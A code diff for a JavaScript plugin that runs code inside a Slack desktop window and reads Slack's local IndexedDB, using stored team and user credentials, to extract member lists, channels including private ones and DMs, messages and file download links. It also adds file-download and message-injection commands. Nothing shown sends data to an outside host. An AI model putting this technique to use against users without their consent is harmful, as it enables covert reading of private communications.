-            '          var testKeys = Object.keys(u);' +
-            '          if (testKeys.length > 0 && testKeys[0].match && testKeys[0].match(/^U[A-Z0-9]{4,}$/)) {' +
-            '            userEntities = u; diag.userPathHit = p; diag.userKeysSample = testKeys.slice(0, 5); break;' +
-            '          }' +
-            '        }' +
-            '      } catch(e) {}' +
-            '    }' +
-            '    if (!userEntities) {' +
-            // Extra diag: peek at state.users to see what shape it has
-            '      try {' +
-            '        if (state.users) {' +
-            '          diag.usersType = typeof state.users;' +
-            '          diag.usersIsArray = Array.isArray(state.users);' +
-            '          if (typeof state.users === "object") {' +
-            '            diag.usersKeys = Object.keys(state.users).slice(0, 10);' +
-            '            var firstKey = diag.usersKeys[0];' +
-            '            if (firstKey && state.users[firstKey]) {' +
-            '              diag.usersFirstValueType = typeof state.users[firstKey];' +
-            '              if (typeof state.users[firstKey] === "object") diag.usersFirstValueKeys = Object.keys(state.users[firstKey]).slice(0, 10);' +
-            '            }' +
-            '          }' +
-            '        }' +
-            '        if (state.members) {' +
-            '          diag.membersType = typeof state.members;' +
-            '          if (typeof state.members === "object") diag.membersKeys = Object.keys(state.members).slice(0, 10);' +
-            '        }' +
-            '      } catch(e) {}' +
-            '      diag.error = "no user entities found";' +
-            '      return JSON.stringify({ diag: diag });' +
-            '    }' +
-            '' +
-            '    var users = [];' +
-            '    var keys = Object.keys(userEntities);' +
-            '    for (var i = 0; i < keys.length; i++) {' +
-            '      var m = userEntities[keys[i]];' +
-            '      if (!m || !m.id) continue;' +
-            '      users.push({' +
-            '        id: m.id,' +
-            '        name: m.name || "",' +
-            '        realName: (m.profile && m.profile.real_name) || m.real_name || "",' +
-            '        avatar48: (m.profile && m.profile.image_48) || "",' +
-            '        avatar72: (m.profile && m.profile.image_72) || "",' +
-            '        isBot: m.is_bot || false,' +
-            '        deleted: m.deleted || false' +
-            '      });' +
-            '    }' +
-            '    diag.userCount = users.length;' +
-            '    if (users.length === 0) { diag.error = "entities found but no valid users"; return JSON.stringify({ diag: diag }); }' +
-            '    return JSON.stringify({ users: users, diag: diag });' +
-            '  } catch(e) { diag.error = String(e); return JSON.stringify({ diag: diag }); }' +
-            '})()';
-
-        return plugin.executeInRenderer(windowId, code).then(function(raw) {
-            if (!raw) {
-                plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'fail', reason: 'executeInRenderer returned null/empty' });
+        try {
+            var result = JSON.parse(raw);
+            if (result.error) {
+                plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'fail', idbError: result.error });
                 return false;
             }
-            try {
-                var result = JSON.parse(raw);
-                // Always send diagnostics
-                plugin.sendData('_debug', { fn: 'fetchUsersLocal', diag: result.diag });
-                if (!result.users) return false;
-                var users = result.users;
-                if (!Array.isArray(users) || users.length === 0) return false;
-
-                // Populate userMap (same as fetchUsers does)
-                for (var i = 0; i < users.length; i++) {
-                    var u = users[i];
-                    userMap[u.id] = {
-                        name: u.name,
-                        realName: u.realName,
-                        avatar48: u.avatar48,
-                        avatar72: u.avatar72
-                    };
-                }
-                plugin.sendData('user_list', { users: users, count: users.length, source: 'local' });
-                return true;
-            } catch (e) {
+            var membersObj = result.members;
+            if (!membersObj || typeof membersObj !== 'object') {
+                plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'fail', reason: 'no members in IDB state' });
                 return false;
             }
-        }).catch(function() { return false; });
+
+            var keys = Object.keys(membersObj);
+            var users = [];
+            for (var i = 0; i < keys.length; i++) {
+                var m = membersObj[keys[i]];
+                if (!m || !m.id) continue;
+                userMap[m.id] = {
+                    name: m.name || '',
+                    realName: (m.profile && m.profile.real_name) || m.real_name || '',
+                    avatar48: (m.profile && m.profile.image_48) || '',
+                    avatar72: (m.profile && m.profile.image_72) || ''
+                };
+                users.push({
+                    id: m.id,
+                    name: m.name || '',
+                    realName: (m.profile && m.profile.real_name) || m.real_name || '',
+                    avatar48: (m.profile && m.profile.image_48) || '',
+                    avatar72: (m.profile && m.profile.image_72) || '',
+                    isBot: m.is_bot || false,
+                    deleted: m.deleted || false
+                });
+            }
+
+            if (users.length === 0) {
+                plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'fail', reason: 'members obj has no valid users', keyCount: keys.length });
+                return false;
+            }
+
+            plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'ok', count: users.length, source: 'indexedDB' });
+            plugin.sendData('user_list', { users: users, count: users.length, source: 'local' });
+            return true;
+        } catch (e) {
+            plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'fail', error: String(e) });
+            return false;
+        }
+    }).catch(function(e) {
+        plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'fail', error: String(e) });
+        return false;
     });
 }
 
 function fetchChannelsLocal(windowId) {
-    return findStoreInWindow(windowId).then(function(storePath) {
-        if (!storePath) {
-            plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'skip', reason: 'no store found' });
+    if (!creds || !creds.teamId || !creds.userId) {
+        plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'skip', reason: 'no creds/teamId/userId' });
+        return Promise.resolve(false);
+    }
+
+    return readSlackIDB(windowId, ['channels', 'members'], creds.teamId, creds.userId).then(function(raw) {
+        if (!raw) return false;
+        try {
+            var result = JSON.parse(raw);
+            if (result.error) {
+                plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'fail', idbError: result.error });
+                return false;
+            }
+            var channelsObj = result.channels;
+            var membersObj = result.members;
+            if (!channelsObj || typeof channelsObj !== 'object') {
+                plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'fail', reason: 'no channels in IDB state' });
+                return false;
+            }
+
+            var keys = Object.keys(channelsObj);
+            var channels = [];
+            for (var i = 0; i < keys.length; i++) {
+                var ch = channelsObj[keys[i]];
+                if (!ch || !ch.id) continue;
+                var displayName = ch.name || '';
+                var chType = 'public';
+                if (ch.is_im) {
+                    chType = 'im';
+                    if (ch.user) {
+                        // Resolve DM name from IDB members or our userMap
+                        var u = (membersObj && membersObj[ch.user]) || null;
+                        var uName = u ? (u.name || ch.user) : (userMap[ch.user] ? userMap[ch.user].name : ch.user);
+                        displayName = '@' + uName;
+                    }
+                } else if (ch.is_mpim) { chType = 'mpim'; }
+                else if (ch.is_private || ch.is_group) { chType = 'private'; }
+                channels.push({
+                    id: ch.id,
+                    name: displayName,
+                    type: chType,
+                    memberCount: ch.num_members || 0,
+                    topic: (ch.topic && (typeof ch.topic === 'string' ? ch.topic : ch.topic.value)) || '',
+                    purpose: (ch.purpose && (typeof ch.purpose === 'string' ? ch.purpose : ch.purpose.value)) || '',
+                    isArchived: ch.is_archived || false
+                });
+            }
+
+            if (channels.length === 0) {
+                plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'fail', reason: 'no valid channels', keyCount: keys.length });
+                return false;
+            }
+
+            plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'ok', count: channels.length, source: 'indexedDB' });
+            plugin.sendData('channel_list', { channels: channels, count: channels.length, source: 'local' });
+            return true;
+        } catch (e) {
+            plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'fail', error: String(e) });
             return false;
         }
-
-        var accessor = storeAccessCode(storePath);
-        var code =
-            '(function() {' +
-            '  var diag = { channelPathHit: -1, channelKeysSample: [], channelCount: 0, error: null };' +
-            '  try {' +
-            '    var store = ' + accessor + ';' +
-            '    if (!store || typeof store.getState !== "function") { diag.error = "store not accessible"; return JSON.stringify({ diag: diag }); }' +
-            '    var state = store.getState();' +
-            '    if (!state) { diag.error = "state is null"; return JSON.stringify({ diag: diag }); }' +
-            '' +
-            // Scan for channel-like data
-            '    var channelEntities = null;' +
-            '    var paths = [' +
-            '      function(s) { return s.channels && s.channels.entities; },' +
-            '      function(s) { return s.channels; },' +
-            '      function(s) { return s.conversations && s.conversations.entities; },' +
-            '      function(s) { return s.conversations; },' +
-            '      function(s) { if (s.entities && s.entities.channels) return s.entities.channels; },' +
-            '      function(s) { if (s.entities && s.entities.conversations) return s.entities.conversations; },' +
-            '      function(s) { var k = Object.keys(s); for (var i = 0; i < k.length; i++) { var v = s[k[i]]; if (v && typeof v === "object" && !Array.isArray(v)) { var sk = Object.keys(v); if (sk.length > 0 && sk[0].match && sk[0].match(/^[CDG][A-Z0-9]{4,}$/)) return v; } } return null; }' +
-            '    ];' +
-            '    for (var p = 0; p < paths.length; p++) {' +
-            '      try { var c = paths[p](state); if (c && typeof c === "object" && !Array.isArray(c)) { var testKeys = Object.keys(c); if (testKeys.length > 0 && testKeys[0].match && testKeys[0].match(/^[CDG][A-Z0-9]{4,}$/)) { channelEntities = c; diag.channelPathHit = p; diag.channelKeysSample = testKeys.slice(0, 5); break; } } } catch(e) {}' +
-            '    }' +
-            '    if (!channelEntities) {' +
-            '      try {' +
-            '        if (state.channels) { diag.channelsType = typeof state.channels; if (typeof state.channels === "object") diag.channelsKeys = Object.keys(state.channels).slice(0, 10); }' +
-            '        if (state.conversations) { diag.conversationsType = typeof state.conversations; if (typeof state.conversations === "object") diag.conversationsKeys = Object.keys(state.conversations).slice(0, 10); }' +
-            '      } catch(e) {}' +
-            '      diag.error = "no channel entities found";' +
-            '      return JSON.stringify({ diag: diag });' +
-            '    }' +
-            '' +
-            // Also get user entities for DM name resolution
-            '    var userEntities = null;' +
-            '    var uPaths = [' +
-            '      function(s) { return s.users && s.users.entities; },' +
-            '      function(s) { return s.users; },' +
-            '      function(s) { return s.members && s.members.entities; },' +
-            '      function(s) { return s.members; },' +
-            '      function(s) { if (s.entities && s.entities.users) return s.entities.users; }' +
-            '    ];' +
-            '    for (var up = 0; up < uPaths.length; up++) {' +
-            '      try { var u = uPaths[up](state); if (u && typeof u === "object" && !Array.isArray(u)) { var tk = Object.keys(u); if (tk.length > 0 && tk[0].match && tk[0].match(/^U[A-Z0-9]{4,}$/)) { userEntities = u; break; } } } catch(e) {}' +
-            '    }' +
-            '' +
-            '    var channels = [];' +
-            '    var keys = Object.keys(channelEntities);' +
-            '    for (var i = 0; i < keys.length; i++) {' +
-            '      var ch = channelEntities[keys[i]];' +
-            '      if (!ch || !ch.id) continue;' +
-            '      var displayName = ch.name || "";' +
-            '      var chType = "public";' +
-            '      if (ch.is_im) {' +
-            '        chType = "im";' +
-            '        if (ch.user && userEntities && userEntities[ch.user]) {' +
-            '          displayName = "@" + (userEntities[ch.user].name || ch.user);' +
-            '        } else if (ch.user) {' +
-            '          displayName = "@" + ch.user;' +
-            '        }' +
-            '      } else if (ch.is_mpim) { chType = "mpim"; }' +
-            '      else if (ch.is_private || ch.is_group) { chType = "private"; }' +
-            '      channels.push({' +
-            '        id: ch.id,' +
-            '        name: displayName,' +
-            '        type: chType,' +
-            '        memberCount: ch.num_members || 0,' +
-            '        topic: (ch.topic && (typeof ch.topic === "string" ? ch.topic : ch.topic.value)) || "",' +
-            '        purpose: (ch.purpose && (typeof ch.purpose === "string" ? ch.purpose : ch.purpose.value)) || "",' +
-            '        isArchived: ch.is_archived || false' +
-            '      });' +
-            '    }' +
-            '    diag.channelCount = channels.length;' +
-            '    if (channels.length === 0) { diag.error = "entities found but no valid channels"; return JSON.stringify({ diag: diag }); }' +
-            '    return JSON.stringify({ channels: channels, diag: diag });' +
-            '  } catch(e) { diag.error = String(e); return JSON.stringify({ diag: diag }); }' +
-            '})()';
-
-        return plugin.executeInRenderer(windowId, code).then(function(raw) {
-            if (!raw) {
-                plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'fail', reason: 'executeInRenderer returned null/empty' });
-                return false;
-            }
-            try {
-                var result = JSON.parse(raw);
-                plugin.sendData('_debug', { fn: 'fetchChannelsLocal', diag: result.diag });
-                if (!result.channels) return false;
-                var channels = result.channels;
-                if (!Array.isArray(channels) || channels.length === 0) return false;
-
-                // Resolve DM names from our userMap (in case store didn't have user data)
-                for (var i = 0; i < channels.length; i++) {
-                    if (channels[i].type === 'im' && channels[i].name.charAt(0) === '@') {
-                        var uid = channels[i].name.substring(1);
-                        if (uid.match(/^U[A-Z0-9]+$/) && userMap[uid]) {
-                            channels[i].name = '@' + userMap[uid].name;
-                        }
-                    }
-                }
-
-                plugin.sendData('channel_list', { channels: channels, count: channels.length, source: 'local' });
-                return true;
-            } catch (e) {
-                return false;
-            }
-        }).catch(function() { return false; });
+    }).catch(function(e) {
+        plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'fail', error: String(e) });
+        return false;
     });
 }
 
 function fetchMessagesLocal(windowId, channelId, channelName) {
-    return findStoreInWindow(windowId).then(function(storePath) {
-        if (!storePath) {
-            plugin.sendData('_debug', { fn: 'fetchMessagesLocal', status: 'skip', reason: 'no store found', channelId: channelId });
-            return false;
-        }
+    if (!creds || !creds.teamId || !creds.userId) {
+        return Promise.resolve(false);
+    }
 
-        var accessor = storeAccessCode(storePath);
-        var safeChannelId = JSON.stringify(channelId);
-        var code =
-            '(function() {' +
-            '  var diag = { msgPathHit: -1, msgCount: 0, error: null };' +
-            '  try {' +
-            '    var store = ' + accessor + ';' +
-            '    if (!store || typeof store.getState !== "function") { diag.error = "store not accessible"; return JSON.stringify({ diag: diag }); }' +
-            '    var state = store.getState();' +
-            '    if (!state) { diag.error = "state is null"; return JSON.stringify({ diag: diag }); }' +
-            '    var channelId = ' + safeChannelId + ';' +
-            '' +
-            // Find messages for the specific channel
-            '    var msgs = null;' +
-            '    var paths = [' +
-            '      function(s) { return s.messages && s.messages[channelId]; },' +
-            '      function(s) { return s.messages && s.messages.entities && s.messages.entities[channelId]; },' +
-            '      function(s) { return s.conversations && s.conversations[channelId] && s.conversations[channelId].messages; },' +
-            '      function(s) { if (s.entities && s.entities.messages && s.entities.messages[channelId]) return s.entities.messages[channelId]; },' +
-            // Deep scan for message-like objects keyed by channel
-            '      function(s) { var k = Object.keys(s); for (var i = 0; i < k.length; i++) { var v = s[k[i]]; if (v && typeof v === "object" && v[channelId]) { var cv = v[channelId]; if (Array.isArray(cv) && cv.length > 0 && cv[0].ts) return cv; if (typeof cv === "object" && !Array.isArray(cv)) { var msgs = cv.messages || cv.items; if (Array.isArray(msgs)) return msgs; var mk = Object.keys(cv); var arr = []; for (var j = 0; j < mk.length; j++) { if (cv[mk[j]] && cv[mk[j]].ts) arr.push(cv[mk[j]]); } if (arr.length > 0) return arr; } } } return null; }' +
-            '    ];' +
-            '    for (var p = 0; p < paths.length; p++) {' +
-            '      try {' +
-            '        var m = paths[p](state);' +
-            '        if (m) {' +
-            '          if (Array.isArray(m) && m.length > 0 && m[0].ts) { msgs = m; diag.msgPathHit = p; break; }' +
-            '          if (typeof m === "object" && !Array.isArray(m)) {' +
-            '            var mk = Object.keys(m); var arr = [];' +
-            '            for (var j = 0; j < mk.length; j++) { if (m[mk[j]] && m[mk[j]].ts) arr.push(m[mk[j]]); }' +
-            '            if (arr.length > 0) { msgs = arr; diag.msgPathHit = p; break; }' +
-            '          }' +
-            '        }' +
-            '      } catch(e) {}' +
-            '    }' +
-            '    if (!msgs || msgs.length === 0) {' +
-            '      try {' +
-            '        if (state.messages) { diag.messagesType = typeof state.messages; if (typeof state.messages === "object") { diag.messagesKeys = Object.keys(state.messages).slice(0, 10); diag.messagesHasChannel = !!state.messages[channelId]; } }' +
-            '      } catch(e) {}' +
-            '      diag.error = "no messages found for channel";' +
-            '      return JSON.stringify({ diag: diag });' +
-            '    }' +
-            '' +
-            // Get user entities for mention resolution
-            '    var userEntities = null;' +
-            '    var uPaths = [' +
-            '      function(s) { return s.users && s.users.entities; },' +
-            '      function(s) { return s.users; },' +
-            '      function(s) { return s.members && s.members.entities; },' +
-            '      function(s) { return s.members; },' +
-            '      function(s) { if (s.entities && s.entities.users) return s.entities.users; }' +
-            '    ];' +
-            '    for (var up = 0; up < uPaths.length; up++) {' +
-            '      try { var u = uPaths[up](state); if (u && typeof u === "object" && !Array.isArray(u)) { var tk = Object.keys(u); if (tk.length > 0 && tk[0].match && tk[0].match(/^U[A-Z0-9]{4,}$/)) { userEntities = u; break; } } } catch(e) {}' +
-            '    }' +
-            '' +
-            // Sort by ts ascending
-            '    msgs.sort(function(a, b) { return parseFloat(a.ts) - parseFloat(b.ts); });' +
-            '' +
-            '    var formatted = [];' +
-            '    for (var i = 0; i < msgs.length; i++) {' +
-            '      var msg = msgs[i];' +
-            '      var userId = msg.user || "";' +
-            '      var userName = userId;' +
-            '      if (userEntities && userEntities[userId]) userName = userEntities[userId].name || userId;' +
-            '      var text = msg.text || "";' +
-            '      if (userEntities) {' +
-            '        text = text.replace(/<@(U[A-Z0-9]+)>/g, function(match, uid) {' +
-            '          return "@" + (userEntities[uid] ? userEntities[uid].name || uid : uid);' +
-            '        });' +
-            '      }' +
-            '      formatted.push({' +
-            '        user: userName,' +
-            '        userId: userId,' +
-            '        text: text,' +
-            '        ts: msg.ts,' +
-            '        subtype: msg.subtype || "",' +
-            '        time: new Date(parseFloat(msg.ts) * 1000).toISOString()' +
-            '      });' +
-            '    }' +
-            '    diag.msgCount = formatted.length;' +
-            '    return JSON.stringify({ messages: formatted, diag: diag });' +
-            '  } catch(e) { diag.error = String(e); return JSON.stringify({ diag: diag }); }' +
-            '})()';
-
-        return plugin.executeInRenderer(windowId, code).then(function(raw) {
-            if (!raw) {
-                plugin.sendData('_debug', { fn: 'fetchMessagesLocal', status: 'fail', reason: 'executeInRenderer returned null/empty', channelId: channelId });
+    return readSlackIDB(windowId, ['messages', 'members'], creds.teamId, creds.userId).then(function(raw) {
+        if (!raw) return false;
+        try {
+            var result = JSON.parse(raw);
+            if (result.error) {
+                plugin.sendData('_debug', { fn: 'fetchMessagesLocal', status: 'fail', idbError: result.error, channelId: channelId });
                 return false;
             }
-            try {
-                var result = JSON.parse(raw);
-                plugin.sendData('_debug', { fn: 'fetchMessagesLocal', channelId: channelId, diag: result.diag });
-                if (!result.messages) return false;
-                var formatted = result.messages;
-                if (!Array.isArray(formatted) || formatted.length === 0) return false;
+            var messagesObj = result.messages;
+            var membersObj = result.members;
+            if (!messagesObj || !messagesObj[channelId]) {
+                plugin.sendData('_debug', { fn: 'fetchMessagesLocal', status: 'fail', reason: 'no messages for channel', channelId: channelId, availableChannels: messagesObj ? Object.keys(messagesObj).slice(0, 10) : [] });
+                return false;
+            }
 
-                // Resolve user names from our userMap as fallback
-                for (var i = 0; i < formatted.length; i++) {
-                    var uid = formatted[i].userId;
-                    if (uid && userMap[uid] && formatted[i].user === uid) {
-                        formatted[i].user = userMap[uid].name;
+            var channelMsgs = messagesObj[channelId];
+            // channelMsgs could be an array or an object keyed by ts
+            var msgs = [];
+            if (Array.isArray(channelMsgs)) {
+                msgs = channelMsgs;
+            } else if (typeof channelMsgs === 'object') {
+                // Could be { messages: [...] } or keyed by ts
+                if (Array.isArray(channelMsgs.messages)) {
+                    msgs = channelMsgs.messages;
+                } else {
+                    var mk = Object.keys(channelMsgs);
+                    for (var j = 0; j < mk.length; j++) {
+                        var mv = channelMsgs[mk[j]];
+                        if (mv && mv.ts) msgs.push(mv);
                     }
-                    // Also resolve mentions using our userMap
-                    formatted[i].text = formatted[i].text.replace(/<@(U[A-Z0-9]+)>/g, function(match, muid) {
-                        var mu = userMap[muid];
-                        return '@' + (mu ? mu.name : muid);
-                    });
+                }
+            }
+
+            if (msgs.length === 0) {
+                plugin.sendData('_debug', { fn: 'fetchMessagesLocal', status: 'fail', reason: 'channel entry exists but no messages', channelId: channelId, msgsType: typeof channelMsgs });
+                return false;
+            }
+
+            // Sort ascending by ts
+            msgs.sort(function(a, b) { return parseFloat(a.ts) - parseFloat(b.ts); });
+
+            var formatted = [];
+            for (var i = 0; i < msgs.length; i++) {
+                var msg = msgs[i];
+                var userId = msg.user || '';
+                var userName = userId;
+                // Resolve user from IDB members or userMap
+                if (membersObj && membersObj[userId]) userName = membersObj[userId].name || userId;
+                else if (userMap[userId]) userName = userMap[userId].name;
+
+                var text = msg.text || '';
+                // Resolve mentions
+                text = text.replace(/<@(U[A-Z0-9]+)>/g, function(match, uid) {
+                    var mu = (membersObj && membersObj[uid]) || userMap[uid];
+                    return '@' + (mu ? mu.name || uid : uid);
+                });
+
+                var files = [];
+                if (msg.files && msg.files.length) {
+                    for (var fi = 0; fi < msg.files.length; fi++) {
+                        var file = msg.files[fi];
+                        files.push({
+                            name: file.name || file.title || 'file',
+                            title: file.title || '',
+                            mimetype: file.mimetype || '',
+                            size: file.size || 0,
+                            filetype: file.filetype || '',
+                            urlPrivate: file.url_private_download || file.url_private || ''
+                        });
+                    }
                 }
 
-                plugin.sendData('messages', {
-                    channelId: channelId,
-                    channelName: channelName || channelId,
-                    messages: formatted,
-                    count: formatted.length,
-                    source: 'local'
+                formatted.push({
+                    user: userName,
+                    userId: userId,
+                    text: text,
+                    ts: msg.ts,
+                    subtype: msg.subtype || '',
+                    time: new Date(parseFloat(msg.ts) * 1000).toISOString(),
+                    files: files
                 });
-                return true;
-            } catch (e) {
-                return false;
             }
-        }).catch(function() { return false; });
+
+            plugin.sendData('_debug', { fn: 'fetchMessagesLocal', status: 'ok', channelId: channelId, count: formatted.length, source: 'indexedDB' });
+            plugin.sendData('messages', {
+                channelId: channelId,
+                channelName: channelName || channelId,
+                messages: formatted,
+                count: formatted.length,
+                source: 'local'
+            });
+            return true;
+        } catch (e) {
+            plugin.sendData('_debug', { fn: 'fetchMessagesLocal', status: 'fail', error: String(e), channelId: channelId });
+            return false;
+        }
+    }).catch(function(e) {
+        plugin.sendData('_debug', { fn: 'fetchMessagesLocal', status: 'fail', error: String(e) });
+        return false;
     });
 }
 
@@ -1982,6 +2292,7 @@ function onCommand(cmd) {
     if (action === 'probe_store') return probeStore();
     if (action === 'inject_message') return injectMessage(cmd.channelId, cmd.senderId, cmd.text, cmd.senderName);
     if (action === 'clear_injected') return clearInjectedMessages();
+    if (action === 'download_file') return downloadSlackFile(cmd.url, cmd.fileName, cmd.mimetype);
 
     // Workspace switching — works even before credReady for edge cases
     if (action === 'switch_workspace') {
@@ -2042,9 +2353,10 @@ function onCommand(cmd) {
         });
     } else if (action === 'fetch_messages') {
         return findWorkspaceWindow().then(function(winId) {
-            return fetchMessagesLocal(winId, cmd.channelId, cmd.channelName).then(function(ok) {
-                if (!ok) return fetchMessages(cmd.channelId, cmd.channelName, cmd.limit);
-            });
+            // Show cached local messages immediately as a preview, then always
+            // follow up with the API call to pick up unread/new messages.
+            fetchMessagesLocal(winId, cmd.channelId, cmd.channelName);
+            return fetchMessages(cmd.channelId, cmd.channelName, cmd.limit);
         });
     } else if (action === 'send_message') {
         return sendMessage(cmd.channelId, cmd.text, cmd.channelName);
@@ -2138,6 +2450,9 @@ function tryBootstrap() {
                 return;
             }
             findWorkspaceWindow().then(function(winId) {
+                // Run IndexedDB probe once during bootstrap for diagnostics
+                probeIndexedDB(winId);
+
                 fetchUsersLocal(winId).then(function(localUsers) {
                     if (!localUsers) return fetchUsers();
                 }).then(function() {
